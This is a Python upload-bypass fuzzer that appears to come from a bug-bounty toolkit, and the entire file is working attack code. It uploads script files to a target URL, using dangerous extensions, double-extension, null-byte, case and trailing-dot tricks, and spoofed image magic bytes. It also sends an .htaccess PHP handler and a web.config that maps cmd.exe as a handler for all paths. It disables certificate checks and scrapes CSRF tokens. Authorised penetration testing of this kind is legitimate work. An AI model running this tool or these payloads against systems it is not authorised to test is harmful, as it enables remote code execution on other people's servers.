#!/usr/bin/env python3
"""Upload Fuzzer — generates and uploads files with different extensions and magic bytes to find upload bypass vulnerabilities.

Usage:
    python3 upload_fuzzer.py --upload-url "https://target.com/upload" --context .bb/context.json
    python3 upload_fuzzer.py --upload-url "https://target.com/upload" --form-field "file" --dry-run
"""
import argparse
import json
import mimetypes
import os
import random
import re
import ssl
import string
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone


EXTENSION_VARIANTS = [
    # Direct PHP extensions
    ("php", "application/x-php", "<?php echo 'PHP_UPLOAD_TEST_EXT_CHECK'; ?>"),
    ("php2", "application/x-php", "<?php echo 'PHP2_UPLOAD_TEST_EXT'; ?>"),
    ("php3", "application/x-php", "<?php echo 'PHP3_UPLOAD_TEST_EXT'; ?>"),
    ("php4", "application/x-php", "<?php echo 'PHP4_UPLOAD_TEST_EXT'; ?>"),
    ("php5", "application/x-php", "<?php echo 'PHP5_UPLOAD_TEST_EXT'; ?>"),
    ("php6", "application/x-php", "<?php echo 'PHP6_UPLOAD_TEST_EXT'; ?>"),
    ("php7", "application/x-php", "<?php echo 'PHP7_UPLOAD_TEST_EXT'; ?>"),
    ("pht", "application/x-php", "<?php echo 'PHT_UPLOAD_TEST_EXT'; ?>"),
    ("phtml", "application/x-php", "<?php echo 'PHTML_UPLOAD_TEST_EXT'; ?>"),
    ("phtm", "application/x-php", "<?php echo 'PHTM_UPLOAD_TEST_EXT'; ?>"),
    ("phar", "application/x-php", "<?php echo 'PHAR_UPLOAD_TEST_EXT'; ?>"),
    ("phps", "application/x-php", "<?php echo 'PHPS_UPLOAD_TEST_EXT'; ?>"),
    ("shtml", "application/x-php", "<?php echo 'SHTML_UPLOAD_TEST_EXT'; ?>"),
    ("inc", "application/x-php", "<?php echo 'INC_UPLOAD_TEST_EXT'; ?>"),
    ("cgi", "application/x-php", "<?php echo 'CGI_UPLOAD_TEST_EXT'; ?>"),
    ("fcgi", "application/x-php", "<?php echo 'FCGI_UPLOAD_TEST_EXT'; ?>"),

    # ASP/ASPX
    ("asp", "text/html", "<% Response.Write('ASP_UPLOAD_TEST') %>"),
    ("aspx", "text/html", "<% Response.Write('ASPX_UPLOAD_TEST') %>"),
    ("asa", "text/html", "<% Response.Write('ASA_UPLOAD_TEST') %>"),
    ("cer", "text/html", "<% Response.Write('CER_UPLOAD_TEST') %>"),
    ("asax", "text/html", "<% Response.Write('ASAX_UPLOAD_TEST') %>"),

    # JSP/Java
    ("jsp", "text/html", "<%= \"JSP_UPLOAD_TEST\" %>"),
    ("jspx", "text/html", "<jsp:root><%= \"JSPX_UPLOAD_TEST\" %></jsp:root>"),
    ("jsw", "text/html", "<%= \"JSW_UPLOAD_TEST\" %>"),
    ("jsv", "text/html", "<%= \"JSV_UPLOAD_TEST\" %>"),
    ("jspf", "text/html", "<%= \"JSPF_UPLOAD_TEST\" %>"),
    ("wss", "text/html", "<%= \"WSS_UPLOAD_TEST\" %>"),
    ("do", "text/html", "<%= \"DO_UPLOAD_TEST\" %>"),
    ("action", "text/html", "<%= \"ACTION_UPLOAD_TEST\" %>"),

    # Other web servers
    ("pl", "text/plain", "#!/usr/bin/perl\nprint 'PERL_UPLOAD_TEST';"),
    ("pm", "text/plain", "#!/usr/bin/perl\nprint 'PM_UPLOAD_TEST';"),
    ("py", "text/plain", "#!/usr/bin/env python3\nprint('PY_UPLOAD_TEST')"),
    ("rb", "text/plain", "#!/usr/bin/env ruby\nputs 'RB_UPLOAD_TEST'"),
    ("sh", "text/plain", "#!/bin/sh\necho 'SH_UPLOAD_TEST'"),

    # .htaccess tricks
    ("htaccess", "text/plain", "AddType application/x-httpd-php .l33t"),

    # Double extensions
    ("php.jpg", "image/jpeg", "<?php echo 'PHP_JPG_UPLOAD_TEST'; ?>"),
    ("php.jpeg", "image/jpeg", "<?php echo 'PHP_JPEG_UPLOAD_TEST'; ?>"),
    ("php.png", "image/png", "<?php echo 'PHP_PNG_UPLOAD_TEST'; ?>"),
    ("php.gif", "image/gif", "<?php echo 'PHP_GIF_UPLOAD_TEST'; ?>"),
    ("php.pdf", "application/pdf", "<?php echo 'PHP_PDF_UPLOAD_TEST'; ?>"),
    ("phtml.jpg", "image/jpeg", "<?php echo 'PHTML_JPG_UPLOAD_TEST'; ?>"),
    ("php5.jpg", "image/jpeg", "<?php echo 'PHP5_JPG_UPLOAD_TEST'; ?>"),

    # Null byte injection
    ("php%00.jpg", "image/jpeg", "<?php echo 'PHP_NULL_BYTE_TEST'; ?>"),
    ("php\\x00.jpg", "image/jpeg", "<?php echo 'PHP_NULL_BYTE_TEST2'; ?>"),
    ("php\x00.jpg", "image/jpeg", "<?php echo 'PHP_NULL_BYTE_TEST3'; ?>"),
    ("php5%00.jpg", "image/jpeg", "<?php echo 'PHP5_NULL_BYTE'; ?>"),
    ("phtml%00.gif", "image/gif", "<?php echo 'PHTML_NULL_BYTE'; ?>"),

    # Case sensitivity
    ("PhP", "application/x-php", "<?php echo 'PHP_CASE_TEST'; ?>"),
    ("Php", "application/x-php", "<?php echo 'PHP_CASE_TEST2'; ?>"),
    ("pHp", "application/x-php", "<?php echo 'PHP_CASE_TEST3'; ?>"),
    ("PHP", "application/x-php", "<?php echo 'PHP_CASE_TEST4'; ?>"),
    ("PHp", "application/x-php", "<?php echo 'PHP_CASE_TEST5'; ?>"),
    ("pHtml", "application/x-php", "<?php echo 'PHTML_CASE_TEST'; ?>"),
    ("PHp5", "application/x-php", "<?php echo 'PHP5_CASE_TEST'; ?>"),

    # Trailing dots, spaces
    ("php.", "application/x-php", "<?php echo 'PHP_TRAILING_DOT'; ?>"),
    ("php ", "application/x-php", "<?php echo 'PHP_TRAILING_SPACE'; ?>"),
    ("php .", "application/x-php", "<?php echo 'PHP_SPACE_DOT'; ?>"),
    ("php. .", "application/x-php", "<?php echo 'PHP_DOT_SPACE_DOT'; ?>"),

    # Special chars
    ("php::$DATA", "application/x-php", "<?php echo 'PHP_NTFS_STREAM'; ?>"),
    ("php%20", "application/x-php", "<?php echo 'PHP_URL_SPACE'; ?>"),

    # Server-side config / includes
    ("shtml", "text/html", "<!--#echo var='SHTML_TEST' -->"),
    ("stm", "text/html", "<!--#echo var='STM_TEST' -->"),
    ("shtm", "text/html", "<!--#echo var='SHTM_TEST' -->"),

    # Web.config
    ("config", "text/xml", "<?xml version='1.0'?><configuration><system.webServer><handlers><add name='test' path='*' verb='*' modules='IsapiModule' scriptProcessor='cmd.exe' resourceType='Unspecified'/></handlers></system.webServer></configuration>"),
]

MAGIC_BYTE_HEADERS = {
    "gif89a": b"GIF89a",
    "gif87a": b"GIF87a",
    "png": b"\x89PNG\r\n\x1a\n",
    "jpeg": b"\xff\xd8\xff\xe0",
    "jpg_exif": b"\xff\xd8\xff\xe1",
    "pdf": b"%PDF-1.",
    "zip": b"PK\x03\x04",
    "bmp": b"BM",
    "webp": b"RIFF",
    "ico": b"\x00\x00\x01\x00",
    "tiff_le": b"II\x2a\x00",
    "tiff_be": b"MM\x00\x2a",
    "mp4": b"\x00\x00\x00\x18ftyp",
    "wav": b"RIFF",
    "ogg": b"OggS",
    "rar": b"Rar!\x1a\x07",
    "7z": b"7z\xbc\xaf'\x1c",
    "docx": b"PK\x03\x04",
    "xlsx": b"PK\x03\x04",
    "elf": b"\x7fELF",
}


def load_context(ctx_path):
    if not ctx_path or not os.path.exists(ctx_path):
        return {}
    try:
        with open(ctx_path) as f:
            return json.load(f)
    except Exception:
        return {}


def generate_unique_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))


def generate_test_files(extensions, magic_bytes, workdir):
    files = []
    uid = generate_unique_id()
    os.makedirs(workdir, exist_ok=True)

    for idx, (ext, content_type, content) in enumerate(extensions):
        fname = f"test_{uid}_{idx}_{ext}"
        fpath = os.path.join(workdir, fname)

        payload_bytes = content.encode("utf-8")

        with open(fpath, "wb") as f:
            f.write(payload_bytes)

        files.append({
            "path": fpath,
            "filename": fname,
            "extension": ext,
            "content_type": content_type,
            "content_preview": content[:80],
            "has_magic_bytes": False,
            "magic_type": None,
        })

    for magic_name, magic_bytes_header in magic_bytes.items():
        base_content = "<?php echo 'MAGIC_BYTE_TEST'; ?>"
        base_bytes = base_content.encode("utf-8")

        for ext, ct, content in [
            ("php", "application/x-php", "<?php echo 'MAGIC_PHP'; ?>"),
            ("php.jpg", "image/jpeg", "<?php echo 'MAGIC_PHP_JPG'; ?>"),
            ("php.gif", "image/gif", "<?php echo 'MAGIC_PHP_GIF'; ?>"),
            ("php.png", "image/png", "<?php echo 'MAGIC_PHP_PNG'; ?>"),
        ]:
            fname = f"test_{uid}_magic_{magic_name}_{ext}"
            fpath = os.path.join(workdir, fname)

            with open(fpath, "wb") as f:
                f.write(magic_bytes_header)
                f.write(b"\n")
                f.write(content.encode("utf-8"))

            files.append({
                "path": fpath,
                "filename": fname,
                "extension": ext,
                "content_type": ct,
                "content_preview": content[:80],
                "has_magic_bytes": True,
                "magic_type": magic_name,
            })

    return files


def extract_upload_form_details(url, timeout=15):
    try:
        import ssl
        import urllib.request
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0 (compatible; UploadFuzzer/2.0)",
        })
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = resp.read().decode("utf-8", errors="replace")
        action_match = re.search(r'action=["\']([^"\']+)["\']', body)
        field_match = re.search(r'<input[^>]*type=["\']file["\'][^>]*name=["\']([^"\']+)["\']', body)
        csrf_match = re.search(r'<input[^>]*name=["\']([^"\']*token[^"\']*|csrf[^"\']*)["\'][^>]*value=["\']([^"\']+)["\']', body, re.I)
        return {
            "form_action": action_match.group(1) if action_match else None,
            "file_field": field_match.group(1) if field_match else "file",
            "csrf_token": csrf_match.group(2) if csrf_match else None,
            "csrf_name": csrf_match.group(1) if csrf_match else None,
        }
    except Exception:
        return {"form_action": None, "file_field": "file", "csrf_token": None, "csrf_name": None}


def upload_file(upload_url, file_path, filename, content_type, file_field="file", extra_fields=None, timeout=30):
    boundary = "----FormBoundary" + generate_unique_id() * 2

    file_data = b""
    with open(file_path, "rb") as f:
        file_data = f.read()

    body_parts = []

    if extra_fields:
        for fname, fval in extra_fields.items():
            body_parts.append(f"--{boundary}".encode())
            body_parts.append(f'Content-Disposition: form-data; name="{fname}"'.encode())
            body_parts.append(b"")
            if isinstance(fval, bytes):
                body_parts.append(fval)
            else:
                body_parts.append(str(fval).encode())

    body_parts.append(f"--{boundary}".encode())
    body_parts.append(f'Content-Disposition: form-data; name="{file_field}"; filename="{filename}"'.encode())
    body_parts.append(f"Content-Type: {content_type}".encode())
    body_parts.append(b"")
    body_parts.append(file_data)
    body_parts.append(f"--{boundary}--".encode())

    body = b"\r\n".join(body_parts)

    try:
        import ssl
        import http.client
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "User-Agent": "Mozilla/5.0 (compatible; UploadFuzzer/2.0)",
        }

        req = urllib.request.Request(upload_url, data=body, headers=headers, method="POST")
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        resp_body = resp.read().decode("utf-8", errors="replace")
        response_headers = dict(resp.headers)

        extracted_urls = extract_response_urls(resp_body)

        return {
            "status": resp.status,
            "body": resp_body,
            "body_len": len(resp_body),
            "response_headers": response_headers,
            "extracted_urls": extracted_urls,
            "success": True,
        }
    except urllib.error.HTTPError as e:
        body = b""
        try:
            body = e.read()
        except Exception:
            pass
        return {
            "status": e.code,
            "body": body.decode("utf-8", errors="replace") if body else "",
            "body_len": len(body) if body else 0,
            "response_headers": dict(e.headers) if hasattr(e, 'headers') else {},
            "extracted_urls": [],
            "success": False,
        }
    except Exception as e:
        return {
            "status": 0,
            "error": str(e),
            "body": "",
            "body_len": 0,
            "response_headers": {},
            "extracted_urls": [],
            "success": False,
        }


def extract_response_urls(body):
    urls = set()
    patterns = [
        re.compile(r'(?:src|href|url|path|link|location|file|upload|redirect)["\'\s:=]+(["\']?)(https?://[^\s"\']+)\1', re.I),
        re.compile(r'(?:location|redirect|url|file|path)["\'\s:=]+(["\']?)(/[^\s"\']+)\1', re.I),
        re.compile(r'(?:uploads?|files?|assets?|images?|media)/([^\s"\'\s<>&]+)', re.I),
    ]
    for pattern in patterns:
        for match in pattern.findall(body):
            if isinstance(match, tuple):
                url = match[-1] if match else ""
            else:
                url = match
            if url and len(url) < 500:
                urls.add(url)
    return list(urls)


def verify_uploaded_file(upload_result, test_content, timeout=10):
    extracted_urls = upload_result.get("extracted_urls", [])
    for url in extracted_urls:
        if not url.startswith("http"):
            continue
        try:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (compatible; UploadFuzzer/2.0)"})
            resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
            body = resp.read().decode("utf-8", errors="replace")
            if test_content[:20] in body or "UPLOAD_TEST" in body:
                return {
                    "accessible": True,
                    "executable": True,
                    "url": url,
                    "status": resp.status,
                    "matched_content": test_content[:50],
                }
            elif resp.status == 200:
                return {
                    "accessible": True,
                    "executable": False,
                    "url": url,
                    "status": resp.status,
                }
        except Exception:
            pass
    return None


def main():
    ap = argparse.ArgumentParser(description="Upload Fuzzer — fuzz file upload with extension and magic byte variants")
    ap.add_argument("--upload-url", required=True, help="Target upload URL (e.g. https://target.com/upload)")
    ap.add_argument("--form-field", default=None, help="Name of the file input field (auto-detected if not provided)")
    ap.add_argument("--context", default=None, help="Path to .bb/context.json for session configuration")
    ap.add_argument("--output", default=None, help="Output JSONL file (default: findings.jsonl)")
    ap.add_argument("--dry-run", action="store_true", help="Generate files without uploading")
    ap.add_argument("--timeout", type=int, default=30, help="Request timeout in seconds (default: 30)")
    ap.add_argument("--no-magic", action="store_true", help="Skip magic byte variants")
    ap.add_argument("--delay", type=float, default=0.5, help="Delay between uploads (default: 0.5s)")
    ap.add_argument("--max-tests", type=int, default=100, help="Max total tests to run (default: 100)")
    ap.add_argument("--workdir", default=None, help="Directory for generated files (default: /tmp/upload_fuzzer)")
    ap.add_argument("--csrf-token", default=None, help="CSRF token value if needed")
    ap.add_argument("--csrf-name", default="csrf_token", help="CSRF token field name (default: csrf_token)")
    ap.add_argument("--cookie", default=None, help="Session cookie string")
    args = ap.parse_args()

    context = load_context(args.context)
    outdir = context.get("OUTDIR", os.getcwd())
    output_file = args.output or os.path.join(outdir, "findings.jsonl")
    workdir = args.workdir or os.path.join(os.path.dirname(output_file) or ".", "generated_files")

    sys.stderr.write(f"[*] Upload URL: {args.upload_url}\n")
    sys.stderr.write(f"[*] Generated files dir: {workdir}\n")

    sys.stderr.write("[*] Probing upload form...\n")
    form_info = extract_upload_form_details(args.upload_url, args.timeout)
    sys.stderr.write(f"    form_action: {form_info.get('form_action','N/A')}\n")
    sys.stderr.write(f"    file_field: {form_info.get('file_field','file')}\n")
    sys.stderr.write(f"    csrf: {form_info.get('csrf_token','none')}\n")

    file_field = args.form_field or form_info.get("file_field", "file")
    csrf_val = args.csrf_token or form_info.get("csrf_token")
    csrf_name = args.csrf_name or form_info.get("csrf_name", "csrf_token")

    # Select extension variants (limit total)
    ext_variants = EXTENSION_VARIANTS[:args.max_tests]
    magic_variants = {} if args.no_magic else MAGIC_BYTE_HEADERS

    sys.stderr.write(f"[*] Using file_field='{file_field}'\n")
    sys.stderr.write(f"[*] Extension variants: {len(ext_variants)}\n")
    sys.stderr.write(f"[*] Magic byte variants: {len(magic_variants)}\n")

    sys.stderr.write("[*] Generating test files...\n")
    test_files = generate_test_files(ext_variants, magic_variants, workdir)
    sys.stderr.write(f"[*] Generated {len(test_files)} test files\n")

    extra_fields = {}
    if csrf_val:
        extra_fields[csrf_name] = csrf_val

    auth_header = context.get("AUTH_HEADER", "")
    cookie = args.cookie or context.get("COOKIE_JAR", "")
    if cookie:
        sys.stderr.write(f"[*] Using cookie: {cookie[:50]}...\n")

    if args.dry_run:
        sys.stderr.write("\n[DRY RUN] Files that would be uploaded:\n")
        for tf in test_files[:20]:
            magic_info = f" [magic:{tf['magic_type']}]" if tf['has_magic_bytes'] else ""
            sys.stderr.write(f"  {tf['filename']} ({tf['extension']}) {tf['content_type']}{magic_info}\n")
        if len(test_files) > 20:
            sys.stderr.write(f"  ... and {len(test_files) - 20} more\n")
        sys.stdout.write(json.dumps({"status": "dry_run", "files_generated": len(test_files)}))
        return

    findings = []
    os.makedirs(os.path.dirname(output_file) or ".", exist_ok=True)

    upload_url = form_info.get("form_action") or args.upload_url
    if upload_url and not upload_url.startswith("http") and not upload_url.startswith("/"):
        upload_url = urllib.parse.urljoin(args.upload_url, upload_url)

    for i, tf in enumerate(test_files):
        sys.stderr.write(f"\n  [{i+1}/{len(test_files)}] Uploading: {tf['filename']} ({tf['extension']})\n")
        sys.stderr.write(f"    content_type: {tf['content_type']} | magic: {tf['has_magic_bytes']}\n")

        try:
            upload_result = upload_file(
                upload_url, tf["path"], tf["filename"],
                tf["content_type"], file_field, extra_fields, args.timeout
            )

            finding = {
                "test_index": i,
                "filename": tf["filename"],
                "extension": tf["extension"],
                "content_type": tf["content_type"],
                "has_magic_bytes": tf["has_magic_bytes"],
                "magic_type": tf["magic_type"],
                "upload_status": upload_result.get("status", 0),
                "upload_body_len": upload_result.get("body_len", 0),
                "extracted_urls": upload_result.get("extracted_urls", []),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "upload_url": upload_url,
            }

            if upload_result.get("status") == 200:
                sys.stderr.write(f"    -> Upload OK (status 200)\n")

                test_content_sig = tf["content_preview"][:20] if len(tf["content_preview"]) > 20 else tf["content_preview"]
                verify = verify_uploaded_file(upload_result, test_content_sig, min(10, args.timeout // 2))
                if verify:
                    finding["verification"] = verify
                    if verify.get("executable"):
                        finding["finding"] = "FILE_UPLOAD_EXECUTABLE"
                        finding["severity"] = "critical"
                        sys.stderr.write(f"    [!] CRITICAL: File executable at {verify.get('url')}\n")
                    elif verify.get("accessible"):
                        finding["finding"] = "FILE_UPLOAD_ACCESSIBLE"
                        finding["severity"] = "high"
                        sys.stderr.write(f"    [*] File accessible at {verify.get('url')}\n")

                # Check for uploaded URL in response
                extracted = upload_result.get("extracted_urls", [])
                if extracted:
                    finding["finding"] = finding.get("finding", "FILE_UPLOAD_CREATED")
                    finding["severity"] = finding.get("severity", "medium")
                    sys.stderr.write(f"    [+] URLs in response: {len(extracted)}\n")

                # Determine if the extension was allowed
                if tf["extension"].startswith(("php", "pht", "phtml", "phar", "asp", "jsp")) and finding.get("severity") in ("critical", "high"):
                    sys.stderr.write(f"    [!] Dangerous extension ({tf['extension']}) was accepted!\n")
                    finding["finding"] = finding.get("finding", "UPLOAD_EXTENSION_BYPASS")
                    finding["severity"] = finding.get("severity", "high")
            elif upload_result.get("status") in (301, 302):
                finding["finding"] = "UPLOAD_REDIRECT"
                finding["severity"] = "medium"
            elif upload_result.get("status", 0) >= 400:
                finding["finding"] = f"UPLOAD_REJECTED_{upload_result.get('status')}"
                finding["severity"] = "info"

            findings.append(finding)

        except Exception as e:
            sys.stderr.write(f"    [ERROR] {e}\n")
            findings.append({
                "test_index": i,
                "filename": tf["filename"],
                "extension": tf["extension"],
                "error": str(e),
                "finding": "UPLOAD_ERROR",
                "severity": "info",
                "timestamp": datetime.now(timezone.utc).isoformat(),
            })

        time.sleep(args.delay)

    with open(output_file, "w") as f:
        for finding in findings:
            f.write(json.dumps(finding) + "\n")

    critical = [f for f in findings if f.get("severity") == "critical"]
    high = [f for f in findings if f.get("severity") == "high"]
    medium = [f for f in findings if f.get("severity") == "medium"]

    # Group successful uploads by extension
    ext_success = set()
    for f in findings:
        if f.get("severity") in ("critical", "high") or f.get("upload_status") == 200:
            ext_success.add(f.get("extension"))

    summary = {
        "total_uploads": len(findings),
        "critical": len(critical),
        "high": len(high),
        "medium": len(medium),
        "successful_extensions": list(ext_success),
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

    sys.stderr.write(f"\n[DONE] {len(findings)} uploads: {len(critical)} critical, {len(high)} high, {len(medium)} medium\n")
    sys.stderr.write(f"[EXTENSIONS ACCEPTED] {sorted(ext_success)}\n")
    sys.stderr.write(f"[OUTPUT] -> {output_file}\n")

    sys.stdout.write(json.dumps(summary) + "\n")


if __name__ == "__main__":
    main()